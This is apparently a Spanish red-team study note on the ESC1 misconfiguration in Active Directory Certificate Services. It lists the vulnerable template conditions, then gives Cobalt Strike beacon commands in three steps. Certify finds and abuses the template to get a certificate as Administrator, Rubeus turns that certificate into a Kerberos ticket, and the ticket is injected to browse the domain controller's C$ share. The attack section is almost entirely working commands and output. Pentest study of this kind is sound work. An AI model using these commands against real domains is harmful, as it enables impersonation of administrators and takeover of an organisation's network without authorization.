---
tags: [ad, adcs, esc1, privilege-escalation, certificates]
status: completo
---

# ESC1 — Misconfigured Client Authentication Templates

> Template con EKU `Client Authentication` donde el requestor puede especificar el SAN (Subject Alternative Name). Permite obtener un TGT como cualquier usuario del dominio.

## Condiciones necesarias

- `ENROLLEE_SUPPLIES_SUBJECT` activo
- `Manager Approval Required: False`
- `Authorized Signatures Required: 0`
- EKU incluye `Client Authentication` (o PKINIT, Smart Card Logon, Any Purpose, SubCA, o vacío)
- Domain Users tienen `Enrollment Rights`

## Detección

```
beacon> execute-assembly Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet

Template Name                : ESC1
Certificate Name Flag        : ENROLLEE_SUPPLIES_SUBJECT
Extended Key Usage           : Client Authentication
Manager Approval Required    : False
Enrollment Rights            : CONTOSO\Domain Users
```

## Ataque

### Paso 1 — Solicitar certificado como Administrator

```
beacon> execute-assembly Certify.exe request \
  --ca "lon-cs-1.contoso.com\CONTOSO Root CA" \
  --template ESC1 \
  --upn Administrator \
  --quiet

# → Devuelve certificado en PFX base64
```

### Paso 2 — Pedir TGT con el certificado (PKINIT)

```
beacon> execute-assembly Rubeus.exe asktgt \
  /user:Administrator \
  /domain:CONTOSO.COM \
  /certificate:<PFX_base64> \
  /enctype:aes256 \
  /nowrap

# → TGT como Administrator
```

### Paso 3 — Usar el TGT

```
beacon> make_token CONTOSO\Administrator FakePass
beacon> execute-assembly Rubeus.exe ptt /ticket:<TGT_b64>
beacon> ls \\lon-dc-1\c$
```

## Ver también

- [[05-ad-attacks/adcs/adcs---introducción|ADCS - Introducción]]
- [[05-ad-attacks/adcs/esc3---certificate-request-agent|ESC3 - Certificate Request Agent]] — variante con Request Agent EKU
- [[05-ad-attacks/adcs/esc4---template-access-control|ESC4 - Template Access Control]] — modificar template para convertirlo en ESC1
